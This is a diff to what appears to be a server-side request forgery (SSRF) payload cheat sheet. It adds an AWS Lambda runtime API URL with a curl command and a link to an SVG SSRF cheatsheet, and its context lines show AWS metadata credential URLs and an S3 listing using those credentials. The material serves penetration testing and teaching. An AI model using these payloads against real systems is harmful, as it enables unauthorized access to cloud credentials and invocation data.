@@ -32,6 +32,7 @@
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
   * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
+  * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
   * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
   * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
   * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
@@ -441,6 +442,17 @@ http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbean
 Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.
 
 
+### SSRF URL for AWS Lambda
+
+AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.
+
+```powershell
+http://localhost:9001/2018-06-01/runtime/invocation/next
+$ curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next"
+```
+
+Docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next
+
 ### SSRF URL for Google Cloud
 
 Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
@@ -632,3 +644,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 - [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
 - [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
+- [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
